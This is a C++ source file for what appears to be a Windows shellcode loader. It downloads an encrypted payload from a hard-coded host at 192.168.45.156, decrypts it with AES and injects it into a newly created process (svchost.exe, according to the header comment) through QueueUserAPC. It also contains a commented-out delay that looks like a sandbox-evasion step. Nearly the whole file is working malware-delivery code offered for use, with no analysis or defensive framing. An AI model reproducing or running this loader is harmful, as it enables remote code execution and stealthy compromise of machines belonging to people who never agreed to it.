#include <Windows.h>
#include <iostream>
#include <vector>
#include <string.h>
#include "common.h"


/*	loader1 exe version
	winapi
	remote shellcode fetch
	remote process creation and apc injection svchost.exe 
	aes decryption
	chunking alloc/copy/protect */


int wmain(int argc, wchar_t* argv[])
{

	std::vector<BYTE>	svPayload;
	BOOL				bStatus = FALSE;
	DWORD				dwStatus = 0;
	DWORD				dwProcessId = 0;
	SIZE_T				szPayloadSize = 0;
	SIZE_T				szPayloadDecryptedSize = 0;
	PBYTE				pbPayload = NULL;
	PBYTE				pbPayloadDecrypted = NULL;
	HANDLE				hProcess = NULL;
	HANDLE				hThread = NULL;
	PVOID				pPayloadAddress = NULL;


	
	 //wait for a bit
	
	//std::cout << "[*] Hi :)" << std::endl;
	//bStatus = Delay(5);
	//if (!bStatus)
	//{
	//	std::cerr << "[-] Delay:\t" << GetLastError() << std::endl;
	//	return -1;
	//}
	//std::cout << "[*] Bye :)" << std::endl;



	LPCWSTR lpUrl = L"http://192.168.45.156:80/Temp/payload.x64.win.enc.bin";
	svPayload = Download(lpUrl);
	pbPayload = svPayload.data();
	szPayloadSize = svPayload.size();
	if (szPayloadSize == 0)
	{
		std::cerr << "[-] Download:\t\t" << "Empty" << std::endl;
		return -1;
	}
	std::cout << "[+] Download:\t\tSUCCESS" << std::endl;
	std::cout << "[*] Downloaded size:\t" << szPayloadSize << std::endl;


	//
	// decrypt
	//
	bStatus = Decrypt(
		pbPayload,
		szPayloadSize,
		pbPayloadDecrypted,
		szPayloadDecryptedSize);
	if (!bStatus)
	{
		std::cerr << "[-] Decrypt:\t\t" << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "[+] Decrypt:\t\tSUCCESS" << std::endl;
	std::cout << "[*] Decrypted size:\t" << szPayloadDecryptedSize << std::endl;


	//
	// create
	//
	bStatus = Create(
		hProcess,
		hThread,
		dwProcessId);
	if (!bStatus)
	{
		std::cerr << "[-] CreateProcess:\t" << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "[+] CreateProcess:\tSUCCESS" << std::endl;
	std::cout << "[*] Process PID:\t" << dwProcessId << std::endl;


	//
	// inject
	// 
	bStatus = Inject(
		pbPayloadDecrypted,
		szPayloadDecryptedSize,
		hProcess,
		pPayloadAddress);
	if (!bStatus)
	{
		std::cerr << "[-] Inject:\t\t" << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "[+] Inject:\t\tSUCCESS" << std::endl;
	std::cout << "[*] Address:\t\t" << pPayloadAddress << std::endl;


	//
	// queue
	//
	dwStatus = QueueUserAPC(
		reinterpret_cast<PAPCFUNC>(pPayloadAddress), 
		hThread, 
		NULL);
	if (dwStatus == 0)
	{
		std::cerr << "[-] QueueUserAPC:\t" << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "[+] QueueUserAPC:\tSUCCESS" << std::endl;
;

	//
	// start process
	//
	bStatus = DebugActiveProcessStop(dwProcessId);
	if (!bStatus)
	{
		std::cerr << "[-] Debug:\t\t" << GetLastError() << std::endl;
		return -1;
	}
	std::cout << "[+] Debug:\t\tSUCCESS" << std::endl;


	//
	// clean up
	//
	CloseHandle(hProcess);
	CloseHandle(hThread);


	return 0;

}

